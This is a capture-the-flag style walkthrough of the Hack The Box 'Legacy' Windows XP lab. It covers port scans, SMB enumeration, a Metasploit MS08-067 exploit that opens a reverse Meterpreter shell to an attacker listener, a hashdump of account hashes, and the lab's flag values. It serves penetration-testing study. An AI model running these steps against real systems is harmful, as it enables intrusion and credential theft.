---
title: HTB - LEGACY - Easy
date: 2026-02-19
tags: ["Windows"]
description: Walkthrough of the HTB - LEGACY lab
difficulty: Easy
---


Difficulty: Easy
OS: Windows (Windows XP)
Date: 2026-02-19
IP: 10.129.227.181


# Summary

Legacy consisted of a Windows host running a vulnerable version of SMB. Initial access was obtained via the MS08-067 exploit which immediately yielded full system permissions.

---

# Reconnaissance


## Initial Nmap Scan

```bash
nmap -sV -sS -T4 -sC -O 10.129.227.181

Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-19 10:35 -0600
Nmap scan report for 10.129.227.181
Host is up (0.083s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:b4:23 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2026-02-24T20:33:04+02:00
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h57m38s, deviation: 1h24m51s, median: 4d23h57m38s
```

Findings:

- SMB (Ports 139, 445)
- MSRPC (Port 135)
- OS: Windows XP

## Nmap UDP Scan

```bash
nmap -sU -sV --top-port 100 10.129.227.181

PORT     STATE         SERVICE      VERSION
123/udp  open          ntp          Microsoft NTP
137/udp  open          netbios-ns   Microsoft Windows Mobile netbios-ns
138/udp  open|filtered netbios-dgm
445/udp  open|filtered microsoft-ds
500/udp  open|filtered isakmp
1025/udp open|filtered blackjack
1900/udp open|filtered upnp
4500/udp open|filtered nat-t-ike
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Findings:

- NTP (Port 123)
- ? (port 137,138)
- SMB (Port 445)
- ? (Port 500)
- ? (Port 1025)
- ? (Port 1900)
- ? (Port 4500)

New knowledge takeaways:

- 137 = NetBIOS name service (NBNS) -> win legacy name resolution
- 138 = NetBIOS datagram service (NBDGM) -> signals legacy NetBIOS presence, connectionless
- 500 = ISAKMP / IKE (internet key exchange) -> signals that the host is either running VPN or has IPSec active; can be enumerated using `ike-scan <ip>`
- 1025 = RPC dynamic port, 1025 is first port in dynamic range and can show up on legacy Windows machines, no strong conclusion
- 1900 = universal plug and play (UPnP) -> legacy windows service with a history of vulnerabilities, `nmap --script upnp-info <ip>`
- 4500 = IPSec, always pairs with port 500, confirms that IPSec is active, not an attack path

## Full Nmap Scan

```bash
nmap -sV -sS -T4 -p- 10.129.227.181
```

Findings: nothing additional discovered

## SMB Enumeration

### Null session attempt (Failed)

```bash
smbclient -N -L //10.129.227.181                               
session setup failed: NT_STATUS_INVALID_PARAMETER
```

### crackmapexec (Failed)

```bash
crackmapexec smb 10.129.227.181 --shares -u '' -p ''
SMB         10.129.227.181  445    LEGACY           [*] Windows 5.1 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
SMB         10.129.227.181  445    LEGACY           [+] legacy\: 
SMB         10.129.227.181  445    LEGACY           [-] Error enumerating shares: STATUS_ACCESS_DENIED
```


### check for EternalBlue (Vulnerable)

```bash
nmap --script smb-vuln-ms17-010 10.129.227.181    

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```

### check for ms08-067 (Vulnerable)

```bash
nmap --script smb-vuln-ms08-067 --script-args=unsafe=1 10.129.227.181
```

New knowledge:

- `--script-args=unsafe=1` required for this script, fails without it

---

# Initial Access

## SMB - EternalBlue (Failed)

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > set lhost tun0
lhost => 10.10.14.228
msf exploit(windows/smb/ms17_010_eternalblue) > set rhost 10.129.227.181
rhost => 10.129.227.181
msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.14.228:4444 
[*] 10.129.227.181:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.227.181:445    - Host is likely VULNERABLE to MS17-010! - Windows 5.1 x86 (32-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.129.227.181:445    - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.227.181:445 - The target is vulnerable.
[-] 10.129.227.181:445 - Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets
[*] Exploit completed, but no session was created.
```

Findings: failed because target machine is 32-bit, standard EternalBlue supports x64

New knowledge: ms17_010_psexec exists and supports 32-bit targets

## SMB - MS08-067 (Success: System)

```bash
msf > search ms08-067

Matching Modules
================

   #   Name                                                             Disclosure Date  Rank   Check  Description
   -   ----                                                             ---------------  ----   -----  -----------
   0   exploit/windows/smb/ms08_067_netapi                              2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption         
```

```bash
msf > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.c
                                       om/docs/using-metasploit/basics/using-metasploit.
                                       html
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, proce
                                        ss, none)
   LHOST     192.168.50.16    yes       The listen address (an interface may be specifie
                                        d)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting



View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms08_067_netapi) > set lhost tun0
lhost => 10.10.14.228
msf exploit(windows/smb/ms08_067_netapi) > set rhost 10.129.227.181
rhost => 10.129.227.181
msf exploit(windows/smb/ms08_067_netapi) > run
[*] Started reverse TCP handler on 10.10.14.228:4444 
[*] 10.129.227.181:445 - Automatically detecting the target...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.129.227.181:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.227.181:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.227.181:445 - Attempting to trigger the vulnerability...
[*] Sending stage (190534 bytes) to 10.129.227.181
[*] Meterpreter session 1 opened (10.10.14.228:4444 -> 10.129.227.181:1032) at 2026-02-19 11:02:13 -0600

meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > ifconfig

Interface  1
============
Name         : MS TCP Loopback interface
Hardware MAC : 00:00:00:00:00:00
MTU          : 1520
IPv4 Address : 127.0.0.1


Interface 65539
============
Name         : AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport
Hardware MAC : 00:50:56:b0:b4:23
MTU          : 1500
IPv4 Address : 10.129.227.181
IPv4 Netmask : 255.255.0.0

meterpreter > 

```

Findings: SYSTEM access acquired, privilege escalation not needed


---


# Post Exploitation


## Credential extraction

```bash
meterpreter > hashdump
Administrator:500:b47234f31e261b47587db580d0d5f393:b1e8bd81ee9a6679befb976c0b9b6827:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:0ca071c2a387b648559a926bfe39f8d7:332e3bd65dbe0af563383faff76c6dc5:::
john:1003:dc6e5a1d0d4929c2969213afe9351474:54ee9a60735ab539438797574a9487ad:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:f2b8398cafc7174be746a74a3a7a3823:::
meterpreter > 

```

Findings: five accounts identified

- Administrator
- Guest
- HelpAssistant
- john
- SUPPORT_388945a0

## Root Flag


```bash
meterpreter > shell
Process 124 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>dir "C:\Documents and Settings\Administrator\Desktop\root.txt
dir "C:\Documents and Settings\Administrator\Desktop\root.txt
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator\Desktop

16/03/2017  08:18 ��                32 root.txt
               1 File(s)             32 bytes
               0 Dir(s)   6.296.641.536 bytes free

C:\WINDOWS\system32>cat root.txt
cat root.txt
'cat' is not recognized as an internal or external command,
operable program or batch file.

C:\WINDOWS\system32>type root.txt
type root.txt
The system cannot find the file specified.

C:\WINDOWS\system32>type "C:\Documents and Settings\Administrator\Desktop\root.txt
type "C:\Documents and Settings\Administrator\Desktop\root.txt
993442d258b0e0ec917cae9e695d5713
C:\WINDOWS\system32>

```

Root Flag: `993442d258b0e0ec917cae9e695d5713`


## User Flag


```bash
C:\WINDOWS\system32>type "C:\Documents and Settings\john\Desktop\     
type "C:\Documents and Settings\john\Desktop\
The system cannot find the path specified.

C:\WINDOWS\system32>dir "C:\Documents and Settings\john\Desktop\flag.txt"
dir "C:\Documents and Settings\john\Desktop\flag.txt"
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

File Not Found

C:\WINDOWS\system32>dir "C:\Documents and Settings\"
dir "C:\Documents and Settings\"
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings

16/03/2017  08:07 ��    <DIR>          .
16/03/2017  08:07 ��    <DIR>          ..
16/03/2017  08:07 ��    <DIR>          Administrator
16/03/2017  07:29 ��    <DIR>          All Users
16/03/2017  07:33 ��    <DIR>          john
               0 File(s)              0 bytes
               5 Dir(s)   6.296.629.248 bytes free

C:\WINDOWS\system32>dir "C:\Documents and Settings\john\Desktop"
dir "C:\Documents and Settings\john\Desktop"
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  08:19 ��    <DIR>          .
16/03/2017  08:19 ��    <DIR>          ..
16/03/2017  08:19 ��                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.296.625.152 bytes free

C:\WINDOWS\system32>type "C:\Documents and Settings\john\Desktop\user.txt"
type "C:\Documents and Settings\john\Desktop\user.txt"
e69af0e4f443de7e36876fda4ec7644f
C:\WINDOWS\system32>

```

User Flag:  `e69af0e4f443de7e36876fda4ec7644f`


## Full Attack Path

1. MS08-067 exploited via Metasploit -> SYSTEM access
2. hashdump performed -> credentials extracted
3. navigated the filesystem to find the root flag
4. navigated the filesystem to find the user flag